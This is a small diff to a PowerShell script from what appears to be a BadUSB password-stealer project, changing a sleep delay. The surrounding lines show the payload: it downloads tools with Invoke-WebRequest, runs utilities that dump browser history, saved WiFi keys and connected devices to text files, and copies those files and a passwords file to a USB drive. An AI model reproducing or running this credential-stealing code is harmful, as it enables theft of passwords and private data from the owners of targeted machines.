@@ -9,7 +9,7 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 .\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt #Create the file for Browser history
 .\WirelessKeyView.exe /stext wifi.txt #Create the file for WiFi passwords
 .\WNetWatcher.exe /stext connected_devices.txt #Create the file for connected devices
-Start-Sleep -Seconds 15 #Wait for 60 seconds (because connected devices file take a minute to be created)
+Start-Sleep -Seconds 25 #Wait for 60 seconds (because connected devices file take a minute to be created)
 Copy-Item C:\Users\Public\Documents\wifi.txt -Destination E:\Passwords
 Copy-Item C:\Users\Public\Documents\history.txt -Destination E:\Passwords
 Copy-Item C:\Users\Public\Documents\passwords.txt -Destination E:\Passwords
